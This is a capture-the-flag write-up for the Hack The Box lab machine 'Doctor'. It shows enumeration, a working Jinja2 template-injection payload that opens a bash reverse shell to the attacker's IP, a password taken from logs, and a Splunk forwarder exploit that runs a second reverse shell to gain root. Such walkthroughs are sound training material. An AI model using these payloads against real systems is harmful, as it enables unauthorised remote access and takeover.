# Introduction

[![Doctor](https://www.hackthebox.eu/storage/avatars/256280ee1fb4fd4d7610881c209a2b5e.png)](https://app.hackthebox.eu/machines/278)

| Point | Description |
| :------:| :------: |
| Name | Doctor   |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 26 Sep 2020   |
| IP | 10.10.10.209   |
| Owned | 18 Feb 2021 |

# Short retelling
* Find another virtual host
* Find service in beta-test
* Use SSTI to get Reverse Shell
* Find password in logs
* Get user.txt
* Use vuln in outdate software to privilage escalation
* Get root.txt

# Enumeration

## Nmap

Let's start reconing machine "Doctor" 10.10.10.209 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/Doctor]
└─# nmap -sV -sC -p- 10.10.10.209                                                                              1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 23:14 EST
Nmap scan report for doctor.htb (10.10.10.209)
Host is up (0.16s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 573.16 seconds
```

There are three open ports 22 (SSH), 80 (HTTP) and 8089 (Splunkd).

Let's start analyzing web-server and add doctor.htb to /etc/hosts and check site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d1.PNG)

The hyperlinks on the pages are leading to nothing. But we find new vhost *doctors.htb*, add it too.

We find out that web site was made with *template form*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d2.PNG)

On web page doctors.htb we can see service *Doctor Secure Messaging*. There are "Login" and "Register" forms.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d3.PNG)

So let's register and try to find something interesting.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d4.PNG)

We can write massages... Ok, let's find more.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d6.PNG)

Check source code of pages doctor.htb and doctors.htb.

In the source code of the page doctor.htb there isn't a somethimg interesting, but in the source code of the page doctors.htb we find reference about beta-tsting archive in direcory /archive.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d5.PNG)

I should we need to bruteforce direcories of pages doctor.hrb and doctors.htb.

And we remember about *Splunk* on https://10.10.10.209:8089/. Let's check it.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d7.PNG)

And we find out *version* of Splunk `Splunk build: 8.0.5`. Try to open some links and we get authorization form.
Ok, we dont have any credentials.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d8.PNG)

## FuFF

At first we will enumerate directories of doctor.htb

```
──(root💀kali)-[/home/kali/HTB/Doctor]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://doctor.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://doctor.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

index.html              [Status: 200, Size: 19848, Words: 5808, Lines: 504]
:: Progress: [46820/46820] :: Job [1/1] :: 231 req/sec :: Duration: [0:03:31] :: Errors: 0 ::
```
No results. Next step is doctors.htb

```
┌──(root💀kali)-[/home/kali/HTB/Doctor]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://doctors.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://doctors.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

account                 [Status: 302, Size: 251, Words: 22, Lines: 4]
archive                 [Status: 200, Size: 101, Words: 7, Lines: 6]
home                    [Status: 302, Size: 245, Words: 22, Lines: 4]
login                   [Status: 200, Size: 4204, Words: 1054, Lines: 95]
logout                  [Status: 302, Size: 217, Words: 22, Lines: 4]
register                [Status: 200, Size: 4493, Words: 1171, Lines: 101]
:: Progress: [46820/46820] :: Job [1/1] :: 228 req/sec :: Duration: [0:03:25] :: Errors: 0 ::
```

And we find direcory */archive*. Let's open it. And we have a blank page.

Checking the source code:

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d9.PNG)

# Explotation#1

When create message in doktors.htb, page redirect us to */home*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d10.PNG)

In the source code of *doctors.htb/archive* we can see our *title*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d11.PNG)

And we remember that the site was made with template. 

I [foud inforamtion](https://portswigger.net/research/server-side-template-injection) about *Template Injection* and two kinds of it Server Side Template Injection (SSTI) and Client Side Template Injection(CSTI).

![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1)

Let's start with `{{7*7}}` and check the result in *doctors.htb/archive* 

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d12.PNG)

We see the result of the calculation `7*7=49`. With this information, I know that this website is vulnerable for *Sever-Side Template Injection*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d13.PNG)

The second step is to changing the payload to `{{7*’7′}}`. The result is again reflecting to the archive page.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d14.PNG)

And template is *Jinja2*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d15.PNG)

Search in google rce for Jinja2:
* https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

After along time I created the payload to execute a reverse shell.

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.16.9/1234 0>&1'").read()}}{%endif%}{%endfor%}
```
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d16.PNG)

And we have reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/Doctor]
└─# nc -lvp 1234                                                                                               1 ⨯
listening on [any] 1234 ...
connect to [10.10.16.9] from doctor.htb [10.10.10.209] 44752
bash: cannot set terminal process group (886): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ 
```

# Privilege Escalation

Upgrade reverse-shell with python 3

```
web@doctor:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

User *web* belongs to the group *(adm)*.

```
uid=0(root) gid=0(root) groups=0(root)                                                                             
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
uid=1003(splunk) gid=1003(splunk) groups=1003(splunk)
```

Users of group *adm* can read */var/log/*

Download and run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

Analyzing the result of script...

We find **password `Guitar123`** in `/var/log/apache2/backup/`

```
[+] Finding passwords inside logs (limit 70)
Binary file /var/log/apache2/access.log.12.gz matches                                                              
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
Binary file /var/log/kern.log.2.gz matches
Binary file /var/log/kern.log.4.gz matches
Binary file /var/log/syslog.4.gz matches
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Sep 23 15:38:45 doctor sudo:    shaun : command not allowed ; TTY=tty1 ; PWD=/home/shaun ; USER=root ; COMMAND=list
```

User **shaun** reset password to **Guitar123**. Try to login as **shaun**.

```
web@doctor:~$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home/web$ cd ~
cd ~
shaun@doctor:~$ ls  
ls
user.txt

shaun@doctor:~$ cat user.txt
cat user.txt
64acf6b629d131795385346c319d092a
```

We have success and get **user.txt**.

# Explotation#2

Run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), analyzing and nothing..

Also I remember about Splunk. Let's use our credentials to login in Splunk.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d17.PNG)

Search some some exploits in google and find good [article](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
Article about a local privilege escalation, or remote code execution, through Splunk Universal Forwarder misconfigurations.

Download exploit from [here](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)

We will run reverse shell as rce in this exploit.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'
```

Run exploit.

```
┌──(root💀kali)-[/home/kali/HTB/Doctor]
└─# python3 splunl_remote.py --host doctor.htb --port 8089 --username shaun --password Guitar123 --payload "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'" --lhost 10.10.16.9
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp2p9zpdl3.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.16.9:8181/
10.10.10.209 - - [19/Feb/2021 02:33:21] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

We get reverse shell as **root**

```
┌──(root💀kali)-[/home/kali/HTB/Doctor]
└─# nc -lvp 4444                                                                                               1 ⨯
listening on [any] 4444 ...
connect to [10.10.16.9] from doctor.htb [10.10.10.209] 35808
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@doctor:/# cd ~
cd ~
root@doctor:/root# ls
ls
root.txt
root@doctor:/root# cat root.txt
cat root.txt
4b7915dc36ce0f1274eb3d78d4dacb35
```

# Result and Resources

1. https://defcon.ru/web-security/3840/
2. https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
3. https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
4. https://portswigger.net/research/server-side-template-injection
5. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
6. https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
7. https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
